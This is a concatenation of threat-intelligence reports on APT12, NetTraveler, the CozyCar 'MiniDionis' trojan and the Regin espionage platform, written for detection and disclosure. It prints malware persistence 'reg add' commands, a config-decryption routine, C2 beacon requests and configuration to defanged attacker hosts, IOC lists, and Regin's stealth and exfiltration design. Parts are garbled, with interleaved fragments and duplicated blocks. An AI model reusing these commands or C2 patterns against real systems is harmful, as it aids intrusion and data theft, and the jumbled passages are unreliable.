immediate changes in TTPs.The pause and retooling by APT12 was covered in the Mandiant 2014 M-
Trends report.Currently, APT12 continues to target organizations and conduct cyber operations using its
new tools.Most recently, FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the
suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company.We expect that APT12
will continue their trend and evolve and change its tactics to stay ahead of network defenders.Note: IOCs for this campaign can be found here.This entry was posted in Botnets, Targeted Attack, Threat Intelligence, Threat Research and tagged
advanced malware, advanced persistent threat, advanced targeted attack, advanced threat actor, APT12,

Targeted Attack by Ned Moran, Mike Oppenheim, Sarah Engle and Richard Wartell.Bookmark the
permalink.NetTraveler APT Gets a Makeover for 10th Birthday
We have written about NetTraveler before HERE and HERE.Earlier this year, we observed an uptick in the number of attacks against Uyghur and Tibetan supporters
using an updated version of the NetTraveler backdoor.Here's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014.The e-mail has two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file."Sabiq sot xadimi gulnar abletning qeyin-Qistaqta olgenliki
            File name
                                      ashkarilanmaqta.doc"
            MD5                       b2385963d3afece16bd7478b4cf290ce
            Size                      381,667 bytes

The .DOC file, which in reality is a "Single File Web Page" container, also known as "Web archive file",
appears to have been created on a system using Microsoft Office - Simplified Chinese.It contains an exploit for the CVE-2012-0158 vulnerability, detected by Kaspersky Lab products as
Exploit.MSWord.CVE-2012-0158.db.If run on a vulnerable version of Microsoft Office, it drops the main module as "net.exe" (detected by
Kaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of
other files.The main C&C module is dumped into
"%SystemRoot%\system32\Windowsupdataney.dll", (detected by Kaspersky as Trojan-
Spy.Win32.TravNet.qfr).to mark
 "HKEY_LOCAL_MACHINE\
 SYSTEM\CurrentControlSe
its presence in the system.Other known mutexes used by older and current variants include:
 t\Services\Windowsupdat
 a" /v ErrorControl /t
 REG_DWORD /d 1 /f
 @reg addBoat-12 Is Running!"HKEY_LOCAL_MACHINE\
         DocHunter2012 Is Running!SYSTEM\CurrentControlSe
 t\Services\Windowsupdat
         Hunter-2012 Is Running!a" /v Start /t REG_DWORD
 /d 2 /fNT-2012 Is Running!@reg add
 "HKEY_LOCAL_MACHINE\
      NetTravler Is Running!NetTravler2012 Is Running!SH-2011 Is Running!ShengHai Is Running!SD2013 is Running!The malware configuration file is written to the "SYSTEM" folder (as opposed to SYSTEM32) and has a
slightly new format compared to "older" NetTraveler samples:




For the record, here's what an older NetTraveler config file looks like:




Obviously, the developers behind NetTraveler have taken steps to try to hide the malware's configuration.Luckily, the encryption is relatively simple to break.The algorithm is as follows:

for (i=0;i<string_size;i++)
decrypted[i]=encrypted[i] - (i + 0xa);

Once decrypted, the new config looks like this:
One can easily see the command-and-control (C&C) server in the screenshot above, which is
"uyghurinfo[.]com".We identified several samples using this new encryption scheme.A list of all the extracted C&C servers can
be found below:

 C&C server            IP                   IP location                      Registrar
                                            Hong Kong, Albert Heng,          SHANGHAI MEICHENG
 ssdcru[.]com          103.30.7.77
                                            Trillion Company                 TECHNOLOGY
                                            United States, Los Angeles,      TODAYNIC.COM
 uygurinfo[.]com       216.83.32.29
                                            Integen Inc                      INC.
                                            Hong Kong, Kowloon,
                                                                             SHANGHAI MEICHENG
 samedone[.]com        122.10.17.130        Hongkong Dingfengxinhui Bgp
                                                                             TECHNOLOGY
                                            Datacenter
                                            Hong Kong, Sun Network           SHANGHAI MEICHENG
 gobackto[.]net        103.1.42.1
                                            (hong Kong) Limited              TECHNOLOGY
                                                                             SHANGHAI MEICHENG
 worksware[.]net       N/A                  N/A
                                                                             TECHNOLOGY
                       was                  Hong Kong, Sun Network           SHANGHAI MEICHENG
 jojomic[.]com
                       202.146.219.14       (hong Kong) Limited              TECHNOLOGY
                                            hong kong hung tai               SHANGHAI MEICHENG
 angellost[.]net       was 103.17.117.201
                                            international holdings           TECHNOLOGY
                                            hong kong hung tai               SHANGHAI MEICHENG
 husden[.]com          was 103.30.7.76
                                            international holdings           TECHNOLOGY

We recommend blocking all these hosts in your firewall.Conclusion

This year, the actors behind NetTraveler celebrate 10 years of activity.Although the earliest samples we
have seen appear to have been compiled in 2005, there are certain indicators that point to 2004 as the
year when their activity started.For 10 years NetTraveler has been targeting various sectors, with a focus on diplomatic, government and
military targets.NetTraveler victims by industry

Most recently, the main focus of interest for cyber-espionage activities revolved around space exploration,
nano-technology, energy production, nuclear power, lasers, medicine and communications.The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can
assume it will stay this way, perhaps for another 10 years.Tracking MiniDionis: CozyCar’s New Ride Is Related to Seaduke

Executive Summary

Unit 42 has uncovered a new campaign from the CozyDuke threat actors, aka CozyCar [1], leveraging
malware that appears to be related to the Seaduke malware described earlier this week by Symantec.[2]

This campaign, which began on July 7, 2015, appears to be targeted at government organizations and
think-tanks located in democratic countries [3], and utilizes compromised, legitimate websites for spear
phishing and command and control activity.Unit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service, which allows
analysts to quickly find correlations among malware samples analyzed by WildFire.All files referenced
throughout the analysis are contained in the IOC table at the end of this blog.Malware Details

The Initial Droppers: Decoy and Downloader

The current CozyCar campaign includes spear phishing emails that deliver the payload from either by a
link to a .zip file on a compromised website or by direct delivery as an attachment to the phish.At the time of our analysis, the phishing link was no longer active.When a user opens the attached file a
poorly detected executable file [VT 1/54] is extracted.The initial dropper is a self-extracting archive (SFX).Upon execution, this executable file will drop two files in the %TEMP% directory: a decoy .wav file and the
secondary dropper.The CozyDuke group commonly uses legitimate media files to trick users.In reality, while the media — a
.wav file with a female voice claiming to be a reporter looking for commentary — is played, the secondary
dropper executes in the background.The secondary dropper requests a .swf file using SSL as illustrated in
the HTTP traffic below.As of this writing, the domain extranet.qualityplanning[.]com resolved to 64.244.34[.]200.GET /webscriptsecurity/view/4/player.swf HTTP/1.1  
Accept: text/html,application/xhtml+xml,*/*  
 
Accept-Language: en_US  
 
User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1;   Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
 
  
Host: extranet.qualityplanning[.]com  
 
Connection: Keep-Alive  

GET /webscriptsecurity/view/4/player.swf HTTP/1.1     

    Accept: text/html,application/xhtml+xml,*/*     

    Accept-Language: en_US     

    User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1;   Trident/4.0; .NET CLR 1.1.4322; .NET
CLR 2.0.50727)

    Host: extranet.qualityplanning[.]com     

    Connection: Keep-Alive  

The secondary dropper then cleans up after itself with a simple vbs script
(md5:0d132ee171768dc30d14590ed2dbadd1) that leaves only the decoy multimedia file behind.But what
did the dropper do with the .swf file?The Real Payload

While the player.swf file downloaded by the second stage dropper does contain media, it is, again, a decoy.The actual flash component of this file is roughly 16kb, leaving approximately 200kb of the file
unaccounted for.The second stage dropper contains decoding routines that decode the arbitrary binary
data into an executable file.The executable file is dropped in %appdata%/Roaming and appears to try and emulate legitimate software
names: TimbuktuDaemon, SearchIndexer, RtkAudioService64, dirmngr, o2flash, and usbrefs64.This file
was not observed on VirusTotal until July 9 and has extremely low detection rates [VT: 3/54].It appears that the authors of this particular iteration of the CozyCar group’s malware internally call it
“miniDionis” according to pdb strings left in the binary
(c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb).It also
appears to be an iteration on the “forkmeimfamous” aka Seaduke malware analyzed by Unit 42 in a
previous blog [4].The malware stores 2 files in the %temp% directory: a configuration file and a secondary dll.The
configuration file’s name matches the final characters of the bot_id that is contained within as per the
sample below:

{
 "bot_id": "8C9U-01MRLXW",
 "host_scripts": [
   "https://www.illuminatistudios.net/mobile/viewer.php"
 ]
} 

{

"bot_id": "8C9U-01MRLXW",

"host_scripts": [

   "https://www.illuminatistudios.net/mobile/viewer.php"

]

}    

Figure 1..net disassembly of the primary payload shows the author’s name for the project, “miniDionis”.Analysis of the secondary dll file (name matches [A-Z0-9]{1}\.tmp) indicates that its primary function is
to serve as a cleanup mechanism for the dropped binary.This is likely an attempt to thwart forensic
investigations.Further examination of memory dumps taken following the execution of miniDionis reveals some clues
into the beaconing activity exhibited.The malware stores configuration values in memory as key:value
pairs:

{
    "autoload_settings": {
        "app_name": "Wuauctl",
        "delete_after": false,
        "exe_name": "Wuauctl.exe"
    },
    "cookie_name": "SSID",
    "enable_autoload": false,
    "first_run_delay": 0,
    "host_scripts": [
        "https://www.illuminatistudios[.‘miniDionis’ configuration keys

Network Communications

The functional payload of this Trojan starts by creating a Mutex by splitting the “bot_id” value in the
configuration on the hyphen (“-“) and using the second portion of the split string (specifically,
“01MRLXW” in the case of this configuration).From a functionality standpoint, the Trojan uses the concept of tasks that are processed and completed
using a pool of threads.To obtain tasks, the Trojan will issue an HTTPS request to the C2 server
(“host_scripts” in the configuration) that resembles the following example beacon:

GET /mobile/viewer.php HTTP/1.1
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: www.illuminatistudios[.]net
Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

GET /mobile/viewer.php HTTP/1.1

Accept: */*

Accept-Language: en-US

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

Host: www.illuminatistudios[.]net

Cookie: SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A

Accept-Encoding: gzip, deflate

Connection: Keep-Alive

The Trojan manually creates the cookie in this HTTP request.The cookie contains ciphertext that the
Trojan creates based on the “bot_id” in the JSON configuration.The Trojan compresses the “bot_id”
string using zlib and then encrypts it using the RC4 algorithm using a generated key.The generated key is
a SHA1 hash of two randomly created strings: the first of which is between 2 and 8 bytes long and the
second is between 1 and 7 characters in length.The ciphertext of the “bot_id” is then based64 encoded and finally the appended to the “cookie_name”
(“SSID=”) in the configuration and sent within the HTTP request to the C2 server.Unit 42 did not observe the first random string (between 2 and 8 characters in length) sent to the C2 in
the first beacon, which would be required by the C2 to reproduce the exact SHA1 hash used as a key to
generate the ciphertext in the cookie.Upon further examination we believe that the C2 will not be able to
decrypt the cookie in the first beacon.Instead, the C2 will respond to the first beacon with data that the
Trojan will use to extract a string, using a function named TrExtractKey seen in Figure 2, to replace the
first random string used to generate the SHA1 hash.Once the C2 and Trojan have synchronized using this string, the C2 will be able to decrypt subsequent
network beacons because the Trojan includes the random string between 1 and 7 characters that makes up
the second half of the SHA1 hash within the cookie field before the ciphertext.Figure 2.TrExtractKey Function Used by MiniDionis to Obtain String from C2 to Synchronize Keys

The C2 communications, and several of the commands we will discuss in this blog, include a rather
interesting technique to manually handle HTTP redirection, such as the HTTP 301 Moved Permanently
and HTTP 302 Found status codes.The technique used to handle these redirections involves checking for the presence of a “Location” field
within the HTTP headers of the server response, then using regular expressions to parse the HTML within
server response to find the appropriate URL.The code contains three regular expressions to parse the HTML to locate the URL, the first of which is
“<a.*?>.*?</a>” that locates all of the tags associated with link within the HTML.The second regular expression of “onclick=\”Accept();\”” locates only links within the HTML with a
specific “onclick” action.The last regular expression of “href\\s*=\\s*(?:[\”‘](?<1>[^\”‘]*)[\”‘]|(?<1>\\S+))” to obtain the correct
URL to interact with as the C2 server.Command handler

Once the C2 and Trojan have synchronized and can decrypt their network communications the C2 server
will begin responding to beacons from the Trojan with JSON blobs.Unit 42 has not received any JSON blobs from an active C2 server, but based on static analysis of the
Trojan determined the JSON would look as follows:

{ 'tasks' : [ {'task_id' : "", 'task_data' : {'command' : "", 'data' : ""} }, ] }

{ 'tasks' : [ {'task_id' : "", 'task_data' : {'command' : "", 'data' : ""} }, ] }

The Trojan takes this JSON blob and adds each task in the list into a pool for processing.Separate worker
threads access this pool of tasks and process the commands and perform the necessary activities.Unit 42 analyzed the Trojan’s command handler and found several commands, as seen in Table 2, which
allows the threat actors to carry out a full range of activities on the system.Available Commands within MiniDionis’ Command Handler

Conclusion

The actors behind the CozyDuke framework are highly sophisticated, motivated, and have become
increasingly bold in their campaigns.We recommend that other security practitioners review the included Indicators of Compromise (IoCs) to
ensure they have not been targets in this campaign, and add the appropriate security controls to prevent
future attacks.This group is reliant on social engineering, and thus, user education remains of paramount importance.Palo Alto Networks customers using WildFire were protected from this campaign.All known elements of
this campaign have been accurately identified by WildFire as malicious.IOCs

domain
domain
domain
domain
hostname
hostname
hostname
ip
ip

ff.whitebirchpaper[.]com
visionresearch[.]com
betawebservices.ntnonline[.]com
staff.shasta[.]com
extranet.qualityplanning[.]com
secure.hgl[.]com
illuminatistudios[.]com
kane-consulting[.]net
edadmin.kearsney[.]com
redbluffchamber[.]com

ip
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
md5
url
url
url
url

Sources

[1] https://securelist.com/blog/research/69731/the-cozyduke-apt/
[2] http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory
[3] http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/
[4] http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/SECURITY RESPONSE




Regin: Top-tier espionage tool
enables stealthy surveillance
Symantec Security Response
﻿﻿

Version 1.0 – November 24, 2014




      Regin is an extremely complex piece of software that can be
      customized with a wide range of different capabilities that
      can be deployed depending on the target.What we have seen in Regin is just such a class of
  malware.Regin is an extremely complex piece of software that can be customized with a wide
  range of different capabilities which can be deployed depending on the target.It is built
  on a framework that is designed to sustain long-term intelligence-gathering operations
  by remaining under the radar.It goes to extraordinary lengths to conceal itself and its
  activities on compromised computers.Its stealth combines many of the most advanced
  techniques that we have ever seen in use.The main purpose of Regin is intelligence gathering and it has been implicated in data
  collection operations against government organizations, infrastructure operators,
  businesses, academics, and private individuals.The level of sophistication and complexity
  of Regin suggests that the development of this threat could have taken well-resourced
  teams of developers many months or years to develop and maintain.Regin is a multi-staged, modular threat, meaning that it has a number of components,
  each depending on others, to perform attack operations.This modular approach gives
  flexibility to the threat operators as they can load custom features tailored to individual
  targets when required.Some custom payloads are very advanced and exhibit a high
  degree of expertise in specialist sectors.The modular design also makes analysis of the
  threat difficult, as all components must be available in order to fully understand it.This
  modular approach has been seen in other sophisticated malware families such as Flamer
  and Weevil (The Mask), while the multi-stage loading architecture is similar to that seen
  in the Duqu/Stuxnet family of threats.Regin is different to what are commonly referred to as “traditional” advanced persistent
  threats (APTs), both in its techniques and ultimate purpose.APTs typically seek specific
  information, usually intellectual property.Regin’s purpose is different.It is used for the
  collection of data and continuous monitoring of targeted organizations or individuals.This report provides a technical analysis of Regin based on a number of identified
  samples and components.This analysis illustrates Regin’s architecture and the many
  payloads at its disposal.INTRODUCTION




Regin has a wide
range of standard
capabilities,
particularly around
monitoring targets
and stealing data.Regin: Top-tier espionage tool enables stealthy surveillance




Introduction
    Regin is a multi-purpose data collection tool which dates back several years.Symantec first began looking into
    this threat in the fall of 2013.Multiple versions of Regin were found in the wild, targeting several corporations,
    institutions, academics, and individuals.Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data.It also
    has the ability to load custom features tailored to individual targets.Some of Regin’s custom payloads point to a
    high level of specialist knowledge in particular sectors, such as telecoms infrastructure software, on the part of
    the developers.Regin is capable of installing a large number of additional payloads, some highly customized for the targeted
    computer.The threat’s standard capabilities include several remote access Trojan (RAT) features, such as
    capturing screenshots and taking control of the mouse’s point-and-click functions.Regin is also configured to
    steal passwords, monitor network traffic, and gather information on processes and memory utilization.It can
    also scan for deleted files on an infected computer and retrieve them.More advanced payload modules designed
    with specific goals in mind were also found in our investigations.For example, one module was designed to
    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed
    to collect administration traffic for mobile telephony base station controllers, while another was created
    specifically for parsing mail from Exchange databases.Regin goes to some lengths to hide the data it is stealing.Valuable target data is often not written to disk.In
    some cases, Symantec was only able to retrieve the threat samples but not the files containing stolen data.Timeline
    Symantec is aware of two distinct versions of Regin.Version 1.0 appears to have been used from at least 2008 to
    2011.Version 2.0 has been used from 2013 onwards, though it may have possibly been used earlier.Version 1.0 appears to have been abruptly withdrawn from circulation in 2011.Version 1.0 samples found after
    this date seem to have been improperly removed or were no longer accessible to the attackers for removal.This report is based primarily on our analysis of Regin version 1.0.We also touch on version 2.0, for which we
    only recovered 64-bit files.Symantec has assigned these version identifiers as they are the only two versions that have been acquired.Regin
    likely has more than two versions.There may be versions prior to 1.0 and versions between 1.0 and 2.0.Page 5
                                                         Regin: Top-tier espionage tool enables stealthy surveillance




Target profile
    The Regin operators do not appear to
    focus on any specific industry sector.Regin infections have been observed
    in a variety of organizations,
    including private companies,
    government entities, and research
    institutes.Infections are also geographically
    diverse, having been identified
    mainly in 10 different regions.Infection vector
    The infection vector varies among
    targets.A reproducible infection
    vector is unconfirmed at time of
    writing.Targets may be tricked into
    visiting spoofed versions of well-
    known websites and the threat may
    be installed through a web browser
    or by exploiting an application.On
    one computer, log files show that
    Regin originated from Yahoo!Instant
    Messenger through an unconfirmed
    exploit.Figure 1.Confirmed Regin infections by sector




                                             Figure 2.Confirmed Regin infections by country



                                                         Page 6
ARCHITECTURE




               The initial Stage 1
               driver is the only
               plainly visible code
               on the computer.All other stages are
               stored as encrypted
               data blobs...
                                                          Regin: Top-tier espionage tool enables stealthy surveillance




Architecture
    Regin has a six-stage architecture.The initial        Table 1.The six stages of Regin
    stages involve the installation and configuration
    of the threat’s internal services.The later stages    Stages          Components
    bring Regin’s main payloads into play.This            Stage 0         Dropper.Installs Regin onto the target computer
    section presents a brief overview of the format
                                                           Stage 1         Loads driver
    and purpose of each stage.The most interesting
    stages are the executables and data files stored       Stage 2         Loads driver
    in Stages 4 and 5.The initial Stage 1 driver is       Stage 3         Loads compression, encryption, networking, and han-
    the only plainly visible code on the computer.All                     dling for an encrypted virtual file system (EVFS).other stages are stored as encrypted data blobs,
                                                           Stage 4         Utilizes the EVFS and loads additional kernel mode
    as a file or within a non-traditional file storage
                                                                           drivers, including payloads.area such as the registry, extended attributes, or
    raw sectors at the end of disk.Stage 5         Main payloads and data files




    Figure 3.Regin’s architecture



                                                          Page 8
                                                        Regin: Top-tier espionage tool enables stealthy surveillance




Stage 0 (dropper)
  Symantec Security Response has not obtained the Regin dropper at the time of writing.Symantec believes that
  once the dropper is executed on the target’s computer, it will install and execute Stage 1.It’s likely that Stage
  0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded
  versions of stages 2, 3, and potentially stages 4 and onwards.The dropper could be transient rather than acting
  as an executable file and may possibly be part of the infection vector exploit code.Stage 1
  Stage 1 is the initial load point for the threat.There are two known Stage 1 file names:
  •	 usbclass.sys (version 1.0)
  •	 adpu160.sys (version 2.0)
  These are kernel drivers that load and execute Stage 2.These kernel drivers may be registered as a system
  service or may have an associated registry key to load the driver while the computer is starting up.Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes.If no extended attributes are
  found, Stage 2 is executed from a set of registry keys.Stage 2
  Stage 2 is a kernel driver that simply extracts, installs and runs Stage 3.Stage 2 is not stored in the traditional
  file system, but is encrypted within an extended attribute or a registry key blob.Stage 2 can be found encrypted in:

  Extended attribute
  •	 %Windir%
  •	 %Windir%\fonts
  •	 %Windir%\cursors (possibly only in version 2.0)
  Registry subkey
  •	 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
     D0204917CA58}
  •	 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\RestoreList\VideoBase (possibly only in version
     2.0)
  This stage can also hide running instances of Stage 1.Once this happens, there are no remaining plainly visible
  code artifacts.Similar to previous stages, Stage 2 finds and loads an encrypted version of Stage 3 from either
  NTFS extended attributes or a registry key blob.Stage 2 can also monitor the state of the threat.This stage drops the file msrdc64.dat, which appears to always
  be 512 bytes in size.The first two bytes are used and the remaining bytes are set to zero.The second byte
  indicates the exclusive maximum number of instances allowed to run, which is set to two.This means no more
  than one instance should run at any time.The first byte indicates how many instances were run or attempted to
  run.Therefore, the potential combinations for the first two bytes are:
  •	 00 02 (the threat is not running)
  •	 01 02 (the threat is running)
  •	 02 02 (the threat was running and a second instance has started).Stage 3
  Stage 3 is a kernel mode DLL and is not stored in the traditional file system.Instead, this file is encrypted within
  an extended attribute or registry key blob.Page 9
                                                      Regin: Top-tier espionage tool enables stealthy surveillance




Stage 3 can be found in the following locations:

Extended attribute
•	 %Windir%\system32
•	 %Windir%\system32\drivers
Registry subkey
•	 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
   D0204917CA5A}
The file is six to seven times the size of the driver in Stage 2.In addition to loading and executing Stage 4, Stage
3 offers a framework for the higher level stages.Stages 3 and above are based on a modular framework of code modules.These modules offer functions through
a private, custom interface.Each file in stages 3 and above can “export” functionality to other parts of Regin.In the case of Stage 3, the following primitives are offered:
•	 The orchestrator, which parses custom records found in the appended data of the executable files for stages
   3 and above.These records contain a list of Regin functionalities to be executed.A record starts with the
   number 0xD912FEAB (little-endian ordering)
•	 Compression and decompression routines
•	 Encryption and decryption routines
•	 Routines to retrieve storage locations of higher-level (Stage 4) components
•	 Routines to handle an encrypted virtual file system used by Stage 4
•	 Network primitives
These primitives are provided through a custom export methodology.Export methodology
The Stage 3 DLL exports a wide range        Table 2.An example of Regin’s methods organized into 12 groups
of functionality through a custom
export methodology.The interface used       Major                           Functionality
to export functionality does not make        0001h                           Core
use of the traditional Windows DLL
                                             000Dh                           Compression, decompression
export mechanism by name or ordinal.000Fh                           Encryption, decryption
Exported Regin methods are referenced
                                             003Dh                           EVFS handling
by a tuple consisting of a major
and minor number.Stage 3 exports            0007h                           Container management
hundreds of methods, organized               000Bh                           Log management
into 12 different major groups.The
numbers used vary across versions.We        0033h                           Loader
acquired artifacts using two different       0011h                           Network
numbering schemes.Table 2 is an
example listing.0013h                           Network
                                             C373h                           TCP command-and-control (C&C)
With Regin’s modular nature, Stage
4 kernel modules and Stage 5 user            0019h                           UDP C&C
modules (payloads) can provide               0009h                           C&C Processor
functionality and export routines using
the same major and minor numbering
scheme.Page 10
                                                        Regin: Top-tier espionage tool enables stealthy surveillance




Stage 4	
  The files for Stage 4, which are loaded by Stage 3, consist of a user-mode orchestrator and multiple kernel
  payload modules.They are stored in two EVFS containers as files:
  •	 %System%\config\SystemAudit.Evt: Contains Stage 4 kernel drivers, which constitute the kernel mode part of
     Regin’s payload.•	 %System%\config\SecurityAudit.Evt: Contains a user mode version of Stage 3.The files are injected into
     services.exe.When the attackers who operated Regin cleaned up compromised computers once they were finished with them,
  they often failed to remove Stage 4 and 5 artifacts from the system.Stage 4 also uses the same export methodology described in Stage 3.Stage 5
  Stage 5 consists of the main Regin payload functionality.The files for Stage 5 are injected into services.exe by
  Stage 4.Stage 5 files are EVFS containers containing other files:
  •	 %System%\config\SystemLog.evt: Contains Stage 5 user mode DLLs.They constitute Regin’s payload.•	 %System%\config\SecurityLog.evt: Contains Stage 5 data files, used by the Stage 4 and 5 components to
     store various data items
  •	 %System%\config\ApplicationLog.evt: Another Stage 5 log container, which is
     referenced by Stage 5 data files
  •	 %Windir%\ime\imesc5\dicts\pintlgbp.imd (version 2.0)
  •	 %Windir%\ime\imesc5\dicts\pintlgbs.imd (version 2.0)
  Regin’s payload involves the DLLs contained in the SystemLog.evt EVFS container.The payload functionality differs depending on the targeted computer.Custom
  payload files will likely be delivered for each specific environment.Example payload
  functionality seen to date includes:
  •	 Sniffing low-level network traffic
  •	 Exfiltrating data through various channels (TCP, UDP, ICMP, HTTP)
  •	 Gathering computer information
  •	 Stealing passwords
  •	 Gathering process and memory information
  •	 Crawling through the file system
  •	 Low level forensics capabilities (for example, retrieving files that were deleted)
  •	 UI manipulation (remote mouse point & click activities, capturing screenshots, etc.)•	 Enumerating IIS web servers and stealing logs
  •	 Sniffing GSM BSC administration network traffic

Encrypted virtual file system containers
  Regin stores data files and payloads on disk in encrypted virtual file system files.Such
  files are accessed by the major routines 3Dh.Files stored inside EVFS containers are
  encrypted with a variant of RC5, using 64-bit blocks and 20 rounds.The encryption
  mode is reverse cipher feedback (CFB).Known extensions for EVFS containers are *.evt and *.imd.The structure of a
  container is similar to the FAT file system.One major difference is that files do          Figure 4.Physical layout
  not have a name; instead, they’re identified using a binary tag.The tag itself is the      of an EVFS container




                                                       Page 11
                                                           Regin: Top-tier espionage tool enables stealthy surveillance




  concatenation of a major number and a minor number.The major number typically indicates the major function
  group that will handle the file.A container starts with the header in Table 3
  (little-endian ordering).Table 3.The container’s header
                                                          Offset                Type       Description
  The header is followed by the file entry table
  (Table 4).Each file entry is 13h+taglen bytes          00h                   WORD       Sector size in bytes
  long.02h                   WORD       Maximum sector count

  The sectors follow (Table 5).A sector of               04h                   WORD       Maximum file count
  sectsize bytes starts with a DWORD pointing to          06h                   BYTE       File tag length (taglen)
  the next sector (if the file does not fit within a
  single sector), followed by sectsize-4 bytes of         07h                   DWORD      Header CRC
  payload data.0Bh                   DWORD      File table CRC

  As explained above, the files are encrypted.0Fh                   WORD       Number of files
  Other layers of encryption and compression              11h                   WORD       Number of sectors in use
  may also be in place, although those would be           13h                   -          Sector-use bitmap
  handled by higher level components.Command-and-control                                      Table 4.The container’s file entry table

operations                                                Offset         Type           Description
                                                          00h            DWORD          CRC
  Regin’s C&C operations are extensive.These
  backchannel operations are bidirectional,        04h           DWORD          File offset
  which means either the attackers can initiate    08h           DWORD          Offset to first sector holding the file data
  communications with compromised computers
  on the border network or the compromised         0Ch           BYTE[taglen]   File tag
  computers can initiate communications with
  the attacker.Furthermore, compromised
  computers can serve as a proxy for other         Table 5.The container’s sectors
  infections and command and control can           Offset      Type                   Description
  also happen in a peer-to-peer fashion.All
                                                   00h         DWORD                  Next sector offset, or 0
  communications are strongly encrypted and
  can happen in a two-stage fashion where the      04h         BYTE[sectsize-4]       Data
  attacker may contact a compromised computer
  using one channel to instruct it to begin
  communications on a different channel.Four transport protocols are available for C&C:
  •	 ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data.The string
     ‘shit’ is scattered in the packet for data validation.In addition, CRC checks use the seed ‘31337’.•	 UDP: Raw UDP payload
  •	 TCP: Raw TCP payload
  •	 HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID,
     SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, PHPSESSID, or phpAds_d.This information
     can be combined with another cookie for validation under the names USERIDTK, UID, GRID, UID=PREF=ID, TM,
     __utma, LM, TMARK, VERSION, or CURRENT
  The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage
  5 payloads, such as C375h and 1Bh.Logging
  Regin logs data to the ApplicationLog.dat file.This file is not an encrypted container, but it is encrypted and
  compressed.Page 12
PAYLOADS




           The extensible
           nature of Regin and
           its custom payloads
           indicate that many
           payloads are likely
           to exist in order to
           enhance Regin’s
           capabilities...
                                                                Regin: Top-tier espionage tool enables stealthy surveillance




Payloads
    Regin can be distributed with various payload modules or receive payload modules after infection.The
    extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in
    order to enhance Regin’s capabilities.Furthermore, we have found data files accompanying payload modules
    that have not been recovered.The following table describes the Stage 4 kernel payload modules and Stage 5
    user mode payload modules, which we have seen several variants of Regin use.Table 6.Regin’s stage 4 kernel payload modules and stage 5 user mode payload modules
     File type Major       Description
     SYS       0003        Driver

     SYS       C433        Rootkit

     SYS       C42B        PE loader

     SYS       C42D        DLL injection

     SYS       C3C3        Network packet filter driver similar to the WinPCap (protocol filter version 3.5)
                           Used to set TCP and UDP pass-through filters and to bypass firewalls.Executes BPF (Berkeley Packet Filter) bytecode, stored in Stage 5 data files.SYS       4E69        Network port blocker
     DLL       C363        Network packet capture
     DLL       4E3B        Retrieve proxy information for a web browser (Internet Explorer, Netscape, Firefox) through registry or configu-
                           ration files (for example, prefs.js, refs.js, etc.)Ability to retrieve partial or complete log information.•	   Partial: Log type, last log, older log timestamps
                           •	   Complete: Entire log data is exfiltrated


    The IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial
    infection and was specifically deployed for a particular target.64-bit version
    Only a small amount of the 64-bit Regin files have been recovered.These samples may represent version 2.0 or
    their differences may possibly be solely specific to 64-bit versions of Regin.We also recovered files from infected
    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that
    aims to retrieve binary data over pipes or sockets and execute the data.File names
    The recovered files do not appear to fundamentally vary from their 32-bit counterparts, apart from a few noteworthy
    differences.The 32-bit and 64-bit versions of Regin use different file names.These differences are shown in the first section of
    this paper as well as in the appendix.Most importantly, in the 64-bit version of Regin, the names of containers are
    changed:
    •	 PINTLGBP.IMD replaces SystemLog.Evt
    •	 PINTLGBPS.IMD replaces SecurityLog.Evt

  Stage differences
    The 64-bit version of Regin’s Stage 1 (wshnetc.dll) is no longer a kernel mode driver, as drivers under 64-bit Windows
    must be signed.Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting
    up.Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of




                                                               Page 15
                                                         Regin: Top-tier espionage tool enables stealthy surveillance




    physical location) on disk and searches for the payload in the raw sectors in this area of the disk.The 64-bit Regin’s Stage 3 has not been recovered.We believe that it may not exist, as the 32-bit version is a driver.Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export
    functionality.Stage 5 uses the following filenames:
    •	 %Windir%\IME\IMESC5\DICTS\PINTLGBP.IMD contains Stage 5 user payloads, replacing SystemLog.Evt in the
       32-bit version
